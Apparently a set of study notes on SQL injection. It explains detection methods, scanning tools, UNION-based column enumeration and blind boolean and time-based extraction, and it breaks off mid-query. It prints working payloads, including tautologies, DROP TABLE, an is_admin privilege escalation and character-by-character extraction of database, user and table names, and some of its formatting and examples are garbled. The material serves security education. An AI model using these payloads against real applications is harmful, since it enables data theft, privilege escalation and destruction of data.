
##  🔍What is SQL injection (SQLi)?

SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. This can allow an attacker to view data that they are not normally able to retrieve. This might include data that belongs to other users, or any other data that the application can access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.
In some situations, an attacker can escalate a SQL injection attack to compromise the underlying server or other back-end infrastructure. It can also enable them to perform denial-of-service attacks.

## 🎯What is the impact of a successful SQL injection attack?
A successful SQL injection attack can result in unauthorized access to sensitive data, such as:

- Passwords.
- Credit card details.
- Personal user information.
- attacker can obtain a persistent backdoor into an organization's systems
# 🛡️ How to Detect SQL Injection

## 🔍 **Manual Detection Techniques**

You can manually detect SQL injection by testing **every input field or parameter** in the application using the following methods:

---

### 1. **Single Quote Test**

- **Input**: `'`
    
- **Goal**: Trigger SQL syntax errors.
    
- **Detection**: Look for:
    
    - Database error messages
        
    - Broken page layout
        
    - Unusual application behavior
        

---

### 2. **Syntax-Based Evaluation**

- Submit SQL-specific syntax that:
    
    - **Returns the original value**
        
    - **Returns a different value**
        
- **Example**:
    
    `?id=1      → Normal response 
    
    `?id=1+1    → Changed response`
    
- **Goal**: Observe differences in behavior to detect injection points.
    

---

### 3. **Boolean-Based Conditions**

- **Payloads**:
    
  `OR 1=1    → Always true 
- `OR 1=2    → Always false`
    
- **Detection**: Differences in page content, redirection, or error handling between the two requests.
    

---

### 4. **Time-Based Blind SQL Injection**

- **Payload**:
    
    
    `' OR SLEEP(5) --`
    
- **Detection**:
    
    - Compare response times
        
    - Long delay indicates SQL query execution
        

---

### 5. **OAST (Out-of-Band Application Security Testing)**

- **Payload**:
    
    - SQL that triggers DNS or HTTP requests (e.g., `xp_dirtree` or `load_file`)
        
- **Detection**:
    
    - Use tools like **Burp Collaborator** to monitor external requests
        
    - Any interaction confirms vulnerability


## ⚙️ Automated SQL Injection



| Tool               | Type       | SQLi Support           | Use Case                           |
| ------------------ | ---------- | ---------------------- | ---------------------------------- |
| **SQLMap**         | CLI, Free  | ✔ Full (Classic/Blind) | Deep exploitation                  |
| **Burp Suite Pro** | GUI, Paid  | ✔✔✔ (Advanced)         | Pro pentesting & manual hybrid use |
| **OWASP ZAP**      | GUI, Free  | ✔ Basic                | Lightweight, beginner friendly     |
| **Nuclei**         | CLI, Free  | ✔ Fast, scalable       | CI/CD & recon automation           |
| **Acunetix**       | GUI, Paid  | ✔✔✔ (Visual & reports) | Enterprise security teams          |
| **Netsparker**     | GUI, Paid  | ✔✔✔ Confirmed exploits | Compliance & enterprise testing    |
| **Wapiti**         | CLI, Free  | ✔ Basic detection      | Developer-oriented quick scans     |
| **Astra**          | SaaS, Paid | ✔ Basic to mid-level   | No setup, cloud scanning           |

# 🧠 SQL Injection in Different Parts of the Query

| Location in Query       | Injection Point    | Example Payload                 | Risk Level         |     |
| ----------------------- | ------------------ | ------------------------------- | ------------------ | --- |
| `SELECT` – WHERE clause | User filter input  | `' OR 1=1 --`                   | 🔥 Very High       |     |
| `UPDATE` – SET clause   | New values         | `', is_admin=1 --`              | 🔥 High (Priv Esc) |     |
| `UPDATE` – WHERE clause | Record target      | `' OR 1=1 --`                   | 🔥 High            |     |
| `INSERT` – Values       | Form inputs        | `'); DROP TABLE users; --`      | 🔥 High            |     |
| `SELECT` – Table/Column | Metadata injection | `* FROM users; DROP TABLE x --` | ⚠️ Moderate        |     |
| `SELECT` – ORDER BY     | Sorting input      | `price; DROP TABLE x --`        | ⚠️ Medium          |     |

| Operator | Returns rows when...        | Example Condition |
| -------- | --------------------------- | ----------------- |
| `AND`    | **All** conditions are true | `1=1and 1=1`      |
| `OR`     | **At least one** is true    | `1or 1=1`         |

| Keyword  | Purpose                            | Example Syntax                                       | Meaning                        |
| -------- | ---------------------------------- | ---------------------------------------------------- | ------------------------------ |
| `LIMIT`  | Restricts number of rows returned  | `SELECT * FROM table LIMIT 10;`                      | Returns first 10 rows          |
| `OFFSET` | Skips rows before returning result | `SELECT * FROM table LIMIT 10 OFFSET 20;`            | Skips 20 rows, returns next 10 |
| Combined | Used for pagination                | `SELECT * FROM table ORDER BY id LIMIT 10 OFFSET 0;` | Page 1 (rows 1–10)             |


# SQL injection UNION attacks

## 🔍What is UNION

### 🔹 1. `UNION`

- The `UNION` operator is used to **combine the result-set of two or more `SELECT` statements**.
    
- Each `SELECT` statement must have the **same number of columns**, in the **same order**, and with **compatible data types**.
sql
`SELECT column1, column2 FROM table1
`UNION`
`SELECT column1, column2 FROM table2;`
sql
`SELECT column1, column2 FROM table1
`UNION
`SELECT column2 FROM table2;`=>  **Syntax error=> have the **same number of columns**

## 🧾 Determining the Number of Columns in a SQL Injection `UNION` Attack

### 🎯 Goal:

To determine how many columns the original SQL query returns so a successful `UNION SELECT` injection can be performed.

---

### ✅ **Method 1: ORDER BY Technique**

- Use incrementing `ORDER BY` clauses to find the number of columns.
    
- Payload examples:
    
    pgsql
    

    
    `' ORDER BY 1--   ' ORDER BY 2--  ' ORDER BY 3--`  
    
- When the index exceeds the actual number of columns, the database throws an error:
    
    - Example:  
        `The ORDER BY position number 3 is out of range...`
        
- **How it helps:** The last successful ORDER BY number = number of columns.
    

---

### ✅ **Method 2: UNION SELECT NULL Technique**

- Use `UNION SELECT` with increasing numbers of `NULL` values.
    
- Payload examples:
    
    sql
    

    
    `' UNION SELECT NULL--   ' UNION SELECT NULL, NULL--  ' UNION SELECT NULL, NULL, NULL--`  
    
- When the count matches the original query, the injection works.
    
- Error when mismatched:
    
    - Example:  
        `All queries combined using a UNION... must have an equal number of expressions...`
        
- **Why use `NULL`:**
    
    - `NULL` is a flexible placeholder that matches any common data type.



# Blind SQL injection



### ✅ **What is Blind SQL Injection?**

**Blind SQLi** occurs when the server processes SQL queries vulnerable to injection, but **does not return visible error messages or query output**. You infer results based on **behavioral changes** (e.g., response time, different responses).

---

### 🧠 Types of Blind SQL Injection

#### 1. **Boolean-Based (Content-Based) Blind SQLi**

- Relies on **true/false** conditions to observe differences in output.
    
- Examples:
    
    sql
    
    
    
    `' AND 1=1 --  (Returns normal page) ' AND 1=2 --  (Returns different/blank page)`
    

#### 2. **Time-Based Blind SQLi**

- Relies on **delays in response** using SQL functions like `SLEEP()` or `WAITFOR DELAY`.
    
- Examples:
    
    sql
    
    
    
    `' OR IF(1=1, SLEEP(5), 0) --  (Response delayed) ' OR IF(1=2, SLEEP(5), 0) --  (No delay)`
    

#### 3. **Out-of-Band (OOB) Blind SQLi**

- Exploits features like **DNS lookups or HTTP requests** to exfiltrate data when there's **no visible response or delay**.
    
- Requires interaction with external systems.
    

---

### 🛠️ Common Techniques

#### 🔍 Boolean-based Enumeration Example

sql



`' AND SUBSTRING((SELECT database()),1,1)='a' --` 

- Try each character (`a` to `z`, `0` to `9`) to build string one char at a time.
    

#### ⏳ Time-based Enumeration Example

sql



`' AND IF(SUBSTRING((SELECT user()),1,1)='r', SLEEP(5), 0) --` 

---

### 🔢 Character-by-Character Extraction

sql



`' AND ASCII(SUBSTRING((SELECT database()),1,1))=100 --` 

sql



`' AND ASCII(SUBSTRING((SELECT database()),1,1)) > 100 --` 

Use binary search or brute-force on ASCII values.

---

### 📚 Useful SQL Functions for Blind SQLi

|Function|Purpose|
|---|---|
|`SUBSTRING(str, pos, len)`|Extract substring|
|`ASCII(char)`|Convert char to ASCII|
|`SLEEP(seconds)`|Delay (MySQL)|
|`WAITFOR DELAY '0:0:5'`|Delay (MSSQL)|
|`LENGTH()` or `CHAR_LENGTH()`|Get length of string|
|`IF(condition, true, false)`|Conditional logic|
|`CASE WHEN THEN`|Alternative to IF|

---

### 🔎 Sample Enumeration Queries

#### 🧱 Current Database

sql



`' AND (SELECT LENGTH(DATABASE()))=6 --  ' AND SUBSTRING(DATABASE(),1,1)='m' --` 

#### 👥 Current User

sql



`' AND ASCII(SUBSTRING(USER(),1,1))=114 --  # 'r'`

#### 📋 Table Names

sql



`' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE())=5 --  ' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0,1),1,1)='u' --` 

#### 📦 Column Names

sql



`' AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT`

